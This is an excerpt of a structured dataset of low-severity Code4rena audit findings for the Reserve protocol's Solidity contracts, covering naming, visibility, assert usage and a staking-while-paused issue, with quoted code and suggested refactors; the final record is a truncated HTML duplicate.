      "content": "Commented code in the protocol.\n\nInstances:<br>\n[L373-L384](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L373-L384)<br>\n[L457-L510](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L457-L510)<br>\n[L339-L372](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L339-L372)<br>\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24588",
      "title": "[O-05] Proper use of get as a function name prefix",
      "impact": "LOW",
      "content": "Clear function names can increase readability. Follow a standard convertion function names such as using get for getter (view/pure) functions.\n\nInstances:\n```solidity\ncontracts/p1/BasketHandler.sol\n\n279: function status\n296: function quantity\n316: function price\n325: function lotPrice\n394: function basketTokens\n407: function quote\n\ncontracts/p1/Distributor.sol\n\n141: function totals\n\ncontracts/p1/RToken.sol\n\n596: function scalingRedemptionRate\n609: function redemptionRateFloor\n621: function issueItem\n628: function redemptionLimit\n\ncontracts/p1/StRSR.sol\n\n425: function exchangeRate\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24587",
      "title": "[O-04] Events is missing indexed fields",
      "impact": "LOW",
      "content": "Index event fields make the field more quickly accessible to off-chain.\n\nEach event should use three indexed fields if there are three or more fields.\n\nInstances in:\n```solidity\ncontracts/interfaces/IDistributor.sol\n\n28: event DistributionSet(address dest, uint16 rTokenDist, uint16 rsrDist);\n\ncontracts/interfaces/IRToken.sol\n\n83: event BasketsNeededChanged(uint192 oldBasketsNeeded, uint192 newBasketsNeeded);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24586",
      "title": "[O-03] Function Naming suggestions",
      "impact": "LOW",
      "content": "Proper use of `_` as a function name prefix and a common pattern is to prefix internal and private function names with `_`.\n\nThis pattern is correctly applied in the Party contracts, however there are some inconsistencies in the libraries.\n\nInstances:\n```solidity\ncontracts/p1/BackingManager.sol\n\n154: function handoutExcessAssets\n\ncontracts/p1/BasketHandler.sol\n\n68: function empty\n75: function setFrom\n87: function add\n356: function quantityMulPrice\n650: function requireValidCollArray\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24585",
      "title": "[O-02] Use a more recent pragma version",
      "impact": "LOW",
      "content": "Old version of solidity is used, consider using the new one `0.8.17`.\n\nYou can see what new versions offer regarding bug fixed [here](https://github.com/ethereum/solidity/blob/develop/Changelog.md)\n\nInstances - All of the contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24584",
      "title": "[O-01] Code contains empty blocks",
      "impact": "LOW",
      "content": "There are some empty blocks, which are unused. The code should do something or at least have a description why it is structured that way.\n\n```solidity\ncontracts/p1/Main.sol\n\n64: function _authorizeUpgrade(address newImplementation) internal override onlyRole(OWNER) {}\n```\n\nOther instances:\n```solidity\ncontracts/p1/RToken.sol\n\n838: function requireNotPausedOrFrozen() private notPausedOrFrozen {}\n\ncontracts/p1/mixins/Component.sol\n\n57: function _authorizeUpgrade(address newImplementation) internal view override governance {}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24583",
      "title": "[R-10] The right value should be used instead of downcasting from uint256 to uint192",
      "impact": "LOW",
      "content": "In the function `requireValidBUExchangeRate` local variables are used to calculate the outcome of low and high.<br>\nAfter that a require statement is made to ensure the BU rate is in range. The problem is that for the local variables uint256 is used and later in the require statement the value are downcasted to uint192.\n\n```solidity\n802:  function requireValidBUExchangeRate() private view {\n803:        uint256 supply = totalSupply();\n804:        if (supply == 0) return;\n805:\n806:        // Note: These are D18s, even though they are uint256s. This is because\n807:        // we cannot assume we stay inside our valid range here, as that is what\n808:        // we are checking in the first place\n809:        uint256 low = (FIX_ONE_256 * basketsNeeded) / supply; // D18{BU/rTok}\n810:        uint256 high = (FIX_ONE_256 * basketsNeeded + (supply - 1)) / supply; // D18{BU/rTok}\n811:\n812:        // 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9\n813:        require(uint192(low) >= 1e9 && uint192(high) <= 1e27, \"BU rate out of range\");\n814:    }\n```\n\nConsider changing the local variables to use uint192 in the first place, instead of downcasting it:\n\n```solidity\n809:        uint192 low = (FIX_ONE_256 * basketsNeeded) / supply; // D18{BU/rTok}\n810:        uint192 high = (FIX_ONE_256 * basketsNeeded + (supply - 1)) / supply; // D18{BU/rTok}\n811:\n812:        // 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9\n813:        require(low >= 1e9 && high <= 1e27, \"BU rate out of range\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24582",
      "title": "[R-09] Function should be deleted, if a modifier already exists doing its job",
      "impact": "LOW",
      "content": "The function `requireNotPausedOrFrozen` is created only to hold the modifier notPausedOrFrozen.<br>\nAnd for this purpose in some functions requireNotPausedOrFrozen is called in order to check if its paused or frozen.<br>\nThis function isn't necessary as the modifier notPausedOrFrozen can just be applied on the functions.\n\n```solidity\ncontracts/p1/RToken.sol\n\n838: function requireNotPausedOrFrozen() private notPausedOrFrozen {}\n```\n```solidity\n520: function claimRewards() external {\n521:        requireNotPausedOrFrozen();\n522:        RewardableLibP1.claimRewards(assetRegistry);\n523:    }\n```\n\nConsider removing `requireNotPausedOrFrozen();` and apply the modifier to the function:\n\n```solidity\n520: function claimRewards() external notPausedOrFrozen {\n521:        RewardableLibP1.claimRewards(assetRegistry);\n522:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24581",
      "title": "[R-08] Shorthand way to write if / else statement",
      "impact": "LOW",
      "content": "The normal if / else statement can be refactored in a shorthand way to write it:\n\n1. Increases readability\n2. Shortens the overall SLOC.\n\n```solidity\ncontracts/p1/BasketHandler.sol\n\n296:  function quantity(IERC20 erc20) public view returns (uint192) {\n297:        try assetRegistry.toColl(erc20) returns (ICollateral coll) {\n298:            if (coll.status() == CollateralStatus.DISABLED) return FIX_ZERO;\n299:\n300:            uint192 refPerTok = coll.refPerTok(); // {ref/tok}\n301:            if (refPerTok > 0) {\n302:                // {tok/BU} = {ref/BU} / {ref/tok}\n303:                return basket.refAmts[erc20].div(refPerTok, CEIL);\n304:            } else {\n305:                return FIX_MAX;\n306:            }\n307:        } catch {\n308:            return FIX_ZERO;\n309:        }\n310:    }\n```\n\nThe above instance can be refactored to:\n\n```solidity\n296:  function quantity(IERC20 erc20) public view returns (uint192) {\n297:        try assetRegistry.toColl(erc20) returns (ICollateral coll) {\n298:            if (coll.status() == CollateralStatus.DISABLED) return FIX_ZERO;\n299:\n300:            uint192 refPerTok = coll.refPerTok(); // {ref/tok}\n301:            returns refPerTok > 0 ? basket.refAmts[erc20].div(refPerTok, CEIL) : FIX_MAX;\n302:        } catch {\n303:            return FIX_ZERO;\n304:        }\n305:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24580",
      "title": "[R-07] Modifier can be applied on the function instead of creating require statement",
      "impact": "LOW",
      "content": "If functions are only allowed to be called by a certain individual, modifier should be used instead of checking with require statement, if the individual is the msg.sender calling the function.\n\n```solidity\ncontracts/p1/RToken.sol\n\n556:  function mint(address recipient, uint256 amtRToken) external {\n557:        requireNotPausedOrFrozen();\n558:        require(_msgSender() == address(backingManager), \"not backing manager\");\n559:        _mint(recipient, amtRToken);\n560:        requireValidBUExchangeRate();\n561:    }\n```\n\nModifier should be created only accessible by the individual and the instance above can be refactored in:\n\n```solidity\n556:  function mint(address recipient, uint256 amtRToken) external onlyManager {\n557:        requireNotPausedOrFrozen();\n558:        _mint(recipient, amtRToken);\n559:        requireValidBUExchangeRate();\n560:    }\n```\n\nOther instances:\n\n```solidity\ncontracts/p1/RToken.sol\n\n579: function setBasketsNeeded\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24579",
      "title": "[R-06] Revert should be used on some functions instead of return",
      "impact": "LOW",
      "content": "Some instances just return without doing anything, consider applying revert statement instead with a descriptive string why it does that.\n\n```solidity\ncontracts/p1/BackingManager.sol\n\n109: if (tradesOpen > 0) return;\n114: if (block.timestamp < basketTimestamp + tradingDelay) return;\n\ncontracts/p1/BasketHandler.sol\n\n96: if (weight == FIX_ZERO) return;\n\ncontracts/p1/Furnace.sol\n\n71: if (uint48(block.timestamp) < uint64(lastPayout) + period) return;\n\ncontracts/p1/RToken.sol\n\n660: if (left >= right) return;\n739: if (queue.left == endId) return;\n\ncontracts/p1/StRSR.sol\n\n310: if (endId == 0 || firstId >= endId) return;\n327: if (rsrAmount == 0) return;\n497: if (block.timestamp < payoutLastPaid + rewardPeriod) return;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24578",
      "title": "[R-05] Some number values can be refactored with `_`",
      "impact": "LOW",
      "content": "Consider using underscores for number values to improve readability.\n\n```solidity\ncontracts/p1/Distributor.sol\n\n165:  require(share.rsrDist <= 10000, \"RSR distribution too high\");\n166:  require(share.rTokenDist <= 10000, \"RToken distribution too high\");\n```\n\nThe above instance can be refactored to:\n\n```solidity\n165:  require(share.rsrDist <= 10_000, \"RSR distribution too high\");\n166:  require(share.rTokenDist <= 10_000, \"RToken distribution too high\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24577",
      "title": "[R-04] If statement should check first, if the status is disabled",
      "impact": "LOW",
      "content": "The if statement in the function `basketsHeldBy` check first if basket's length equals zero and then checks if the basket is invalid and disabled. Consider first checking if the staus is disabled and then if the length equals zero.\n\n```solidity\n432:  function basketsHeldBy(address account) public view returns (uint192 baskets) {\n433:        uint256 length = basket.erc20s.length;\n434:        if (length == 0 || disabled) return FIX_ZERO;\n```\n\nRefactor the instance above to:\n\n```solidity\n432:  function basketsHeldBy(address account) public view returns (uint192 baskets) {\n433:        uint256 length = basket.erc20s.length;\n434:        if (disabled || length == 0) return FIX_ZERO;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24576",
      "title": "[R-03] Unnecessary overflow check can be rafactored in a better way",
      "impact": "LOW",
      "content": "In the function `quantityMulPrice` an unchecked code is made, where the local variable `rawDelta` is calculated and after that an if statement is created, where is check if `rawDelta` overflows. This check won't be needed if we just move the variable above the unchecked block, so it will revert if this ever happens.\n\n```solidity\ncontracts/p1/BasketHandler.sol\n\n356: function quantityMulPrice(uint192 qty, uint192 p) internal pure returns (uint192) {\n\n365:  unchecked {\n366:            // p and mul *are* Fix values, so have 18 decimals (D18)\n367:            uint256 rawDelta = uint256(p) * qty; // {D36} = {D18} * {D18}\n368:            // if we overflowed *, then return FIX_MAX\n369:            if (rawDelta / p != qty) return FIX_MAX;\n```\n\nThe instance above can be refactored to:\n\n```solidity\n356: function quantityMulPrice(uint192 qty, uint192 p) internal pure returns (uint192) {\n\n// rawDelta is moved above the unchecked block and reverts if overflows\n364:  uint256 rawDelta = uint256(p) * qty; // {D36} = {D18} * {D18}\n365:  unchecked {          \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24575",
      "title": "[R-02] Use require instead of assert",
      "impact": "LOW",
      "content": "The Solidity assert() function is meant to assert invariants.\n\nProperly functioning code should never reach a failing assert statement.\n\nInstances:\n```solidity\ncontracts/p1/mixins/RecollateralizationLib.sol\n\n110: assert(doTrade);\n\ncontracts/p1/mixins/RewardableLib.sol\n\n78: assert(erc20s[i].balanceOf(address(this)) >= liabilities[erc20s[i]]);\n102: assert(erc20.balanceOf(address(this)) >= liabilities[erc20]);\n\ncontracts/p1/mixins/TradeLib.sol\n\n44: assert(trade.buyPrice > 0 && trade.buyPrice < FIX_MAX && trade.sellPrice < FIX_MAX);\n108: assert\n168: assert(errorCode == 0x11 || errorCode == 0x12);\n170: assert(keccak256(reason) == UIntOutofBoundsHash);\n\ncontracts/p1/BackingManager.sol\n\n249: assert(tradesOpen == 0 && !basketHandler.fullyCollateralized());\n\ncontracts/p1/BasketHandler.sol\n\n556: assert(targetIndex < targetsLength);\n\ncontracts/p1/StRSR.sol\n\n696: assert(totalStakes + amount < type(uint224).max);\n```\n\nRecommended: Consider whether the condition checked in the assert() is actually an invariant.\n\nIf not, replace the assert() statement with a require() statement.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24574",
      "title": "[R-01] Numeric values having to do with time should use time units for readability",
      "impact": "LOW",
      "content": "Suffixes like seconds, minutes, hours, days and weeks after literal numbers can be used to specify units of time where seconds are the base unit and units are considered naively in the following way:\n\n`1 == 1 seconds`<br>\n`1 minutes == 60 seconds`<br>\n`1 hours == 60 minutes`<br>\n`1 days == 24 hours`<br>\n`1 weeks == 7 days`\n\n```solidity\ncontracts/p1/BackingManager.sol\n\n33: uint48 public constant MAX_TRADING_DELAY = 31536000; // {s} 1 year\n\ncontracts/p1/Broker.sol\n\n24: uint48 public constant MAX_AUCTION_LENGTH = 604800; // {s} max valid duration - 1 week\n\ncontracts/p1/Furnace.sol\n\n16: uint48 public constant MAX_PERIOD = 31536000; // {s} 1 year\n\ncontracts/p1/StRSR.sol\n\n37: uint48 public constant MAX_UNSTAKING_DELAY = 31536000; // {s} 1 year\n38: uint48 public constant MAX_REWARD_PERIOD = 31536000; // {s} 1 year\n``` \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24573",
      "title": "[N-07] Unnecessary check in both the \\_mint and \\_burn function",
      "impact": "LOW",
      "content": "The function `_mint` and burn in StRSR.sol is called only by someone calling the stake and unstake functions.<br>\nA check is made in the functions to ensure the account to mint and burn the amounts isn't address(0).<br>\nHowever this isn't possible as both the stake and unstake function input the address of the msg.sender.<br>\nAnd address(0) can't call this functions, so this checks are unnecessary.\n\n```solidity\ncontracts/p1/StRSR.sol\n\n694:  function _mint(address account, uint256 amount) internal virtual {\n695:        require(account != address(0), \"ERC20: mint to the zero address\");\n696:        assert(totalStakes + amount < type(uint224).max);\n697:\n698:        stakes[era][account] += amount;\n699:        totalStakes += amount;\n700:\n701:        emit Transfer(address(0), account, amount);\n702:        _afterTokenTransfer(address(0), account, amount);\n703:    }\n\n708:  function _burn(address account, uint256 amount) internal virtual {\n709:        // untestable:\n710:        //      _burn is only called from unstake(), which uses msg.sender as `account`\n711:        require(account != address(0), \"ERC20: burn from the zero address\");\n712:\n713:        mapping(address => uint256) storage eraStakes = stakes[era];\n714:        uint256 accountBalance = eraStakes[account];\n715:        // untestable:\n716:        //      _burn is only called from unstake(), which already checks this\n717:        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n718:        unchecked {\n719:            eraStakes[account] = accountBalance - amount;\n720:        }\n721:        totalStakes -= amount;\n722:\n723:        emit Transfer(account, address(0), amount);\n724;        _afterTokenTransfer(account, address(0), amount);\n725:    }\n```\n\nAs you can see in the below instance, everytime the address given to the \\_mint and \\_burn functions will be the msg.sender of stake and unstake:\n\n```solidity\ncontracts/p1/StRSR.sol\n\n212:  function stake(uint256 rsrAmount) external {\n\n228:  address account = _msgSender();\n229:  stakeRSR += rsrAmount;\n230:  _mint(account, stakeAmount);\n```\n\n```solidity\ncontracts/p1/StRSR.sol\n\n257:  function unstake(uint256 stakeAmount) external notPausedOrFrozen {\n258:        address account = _msgSender();\n\n267:        _burn(account, stakeAmount);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24572",
      "title": "[N-06] Unused constructor",
      "impact": "LOW",
      "content": "The constructor does nothing.\n\n```solidity\ncontracts/p1/Main.sol\n\n23: constructor() initializer {}\n\ncontracts/p1/mixins/Component.sol\n\n25: constructor() initializer {}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24571",
      "title": "[N-05] Modifier exists, but not used when needed",
      "impact": "LOW",
      "content": "In the RToken contract, a lot of private calls are made to `requireNotPausedOrFrozen()` checking if it's paused or frozen.\n\nWhile there is already modifier used for this purpose in the contract.\n\nfunction without the modifier:\n\n```solidity\ncontracts/p1/RToken.sol\n\n520:  function claimRewards() external {\n521:        requireNotPausedOrFrozen();\n522:        RewardableLibP1.claimRewards(assetRegistry);\n523:    }\n```\n\nfunction with the modifier used:\n\n```solidity\ncontracts/p1/RToken.sol\n\n378: function vest(address account, uint256 endId) external notPausedOrFrozen {\n```\n\nAs you can see there is already modifier with this purpose, but it isn't used on all of the functions.\n\nConsider applying it on the other instances as well.\n\n```solidity\ncontracts/p1/RToken.sol\n\n520: function claimRewards\n527: function claimRewardsSingle\n534: function sweepRewards\n541: function sweepRewardsSingle\n556: function mint\n579: function setBasketsNeeded\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24570",
      "title": "[N-04] Inconsistent visibility on the bool \"disabled\"",
      "impact": "LOW",
      "content": "In some contracts the visibility of the bool `disabled` is set as private, while on others it is set as public.\n\nInstances:\n```solidity\ncontracts/p1/BasketHandler.sol\n\n139: bool private disabled;\n\ncontracts/p1/Broker.sol\n\n41: bool public disabled;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24569",
      "title": "[N-03] Using while for unbounded loops isn't recommended",
      "impact": "LOW",
      "content": "Don't write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.\n\nFor the reason above, while and do while loops are rarely used.\n\n```solidity\ncontracts/p1/BasketHandler.sol\n\n523: while (_targetNames.length() > 0)\n\ncontracts/p1/StRSR.sol\n\n449: while (left < right - 1) {\n\ncontracts/p1/StRSRVotes.sol\n\n103: while (low < high) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24568",
      "title": "[N-02] Max value can't be applied in the setters",
      "impact": "LOW",
      "content": "The function `setTradingDelay` is used by the governance to change the tradingDelay.\n\nHowever in the require statement applying the maximum delay is not allowed.\n\nConsider changing the require statement to: `require(val < MAX_TRADING_DELAY, \"invalid tradingDelay\")`\n\nOther instances:\n\n```solidity\ncontracts/p1/BackingManager.sol\n\n263: function setBackingBuffer\n\ncontracts/p1/Broker.sol\n\n133: function setAuctionLength\n\ncontracts/p1/Furnace.sol\n\n88: function setPeriod\n96: function setRatio\n\ncontracts/p1/RToken.sol\n\n589: function setIssuanceRate\n602: function setScalingRedemptionRate\n\ncontracts/p1/StRSR.sol\n\n812: function setUnstakingDelay\n820: function setRewardPeriod\n828: function setRewardRatio\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24567",
      "title": "[N-01] Create your own import names instead of using the regular ones",
      "impact": "LOW",
      "content": "For better readability, you should name the imports instead of using the regular ones.\n\nExample:\n```solidity\n6: {IStRSRVotes} import \"../interfaces/IStRSRVotes.sol\";\n```\n\nInstances - All of the contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24566",
      "title": "[L-02] Stake function shouldn't be accessible, when the status is paused or frozen",
      "impact": "LOW",
      "content": "The function `stake` in StRSR.sol is used by users to stake a RSR amount on the corresponding RToken to earn yield and over-collateralize the system. If the contract is in paused or frozen status, some of the main functions `payoutRewards`, `unstake`, `withdraw` and `seizeRSR` can't be used. The `stake` function will keep operating but will skip to payoutRewards, this is problematic considering if the status is paused or frozen and a user stakes without knowing that. He won't be able to unstake or call any of the core functions, the only option he has is to wait for the status to be unpaused or unfrozen.\n\nConsider if a contract is in paused or frozen status to turn off all of the core functions including staking as well.\n\n```solidity\ncontracts/p1/StRSR.sol\n\n212:  function stake(uint256 rsrAmount) external {\n213:        require(rsrAmount > 0, \"Cannot stake zero\");\n214:\n215:        if (!main.pausedOrFrozen()) _payoutRewards();\n216:\n217:        // Compute stake amount\n218:        // This is not an overflow risk according to our expected ranges:\n219:        //   rsrAmount <= 1e29, totalStaked <= 1e38, 1e29 * 1e38 < 2^256.\n220:        // stakeAmount: how many stRSR the user shall receive.\n221:        // pick stakeAmount as big as we can such that (newTotalStakes <= newStakeRSR * stakeRate)\n222:        uint256 newStakeRSR = stakeRSR + rsrAmount;\n223:        // newTotalStakes: {qStRSR} = D18{qStRSR/qRSR} * {qRSR} / D18\n224:        uint256 newTotalStakes = (stakeRate * newStakeRSR) / FIX_ONE;\n225:        uint256 stakeAmount = newTotalStakes - totalStakes;\n226:\n227:        // Update staked\n228:        address account = _msgSender();\n229:        stakeRSR += rsrAmount;\n230:        _mint(account, stakeAmount);\n231:\n232:        // Transfer RSR from account to this contract\n233:        emit Staked(era, account, rsrAmount, stakeAmount);\n234:\n235:        // == Interactions ==\n236:        IERC20Upgradeable(address(rsr)).safeTransferFrom(account, address(this), rsrAmount);\n237:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "16037",
      "title": "[L-02] Stake function shouldn’t be accessible, when the status is paused or frozen",
      "impact": "LOW",
      "content": "<h2 id=\"l-02-stake-function-shouldnt-be-accessible-when-the-status-is-paused-or-frozen\" style=\"position:relative;\"><a href=\"#l-02-stake-function-shouldnt-be-accessible-when-the-status-is-paused-or-frozen\" aria-label=\"l 02 stake function shouldnt be accessible when the status is paused or frozen permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Stake function shouldn’t be accessible, when the status is paused or frozen</h2>\n<p>The function <code>stake</code> in StRSR.sol is used by users to stake a RSR amount on the corresponding RToken to earn yield and over-collateralize the system. If the contract is in paused or frozen status, some of the main functions <code>payoutRewards</code>, <code>unstake</code>, <code>withdraw</code> and <code>seizeRSR</code> can’t be used. The <code>stake</code> function will keep operating but will skip to payoutRewards, this is problematic considering if the status is paused or frozen and a user stakes without knowing that. He won’t be able to unstake or call any of the core functions, the only option he has is to wait for the status to be unpaused or unfrozen.</p>\n<p>Consider if a contract is in paused or frozen status to turn off all of the core functions including staking as well.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">\"Cannot stake zero\"</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pausedOrFrozen</span><span class=\"mtk1\">()) </span><span class=\"mtk11\">_payoutRewards</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Compute stake amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">218</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// This is not an overflow risk according to our expected ranges:</span></span></span>\n<span class=\"grvsc-line\"><span 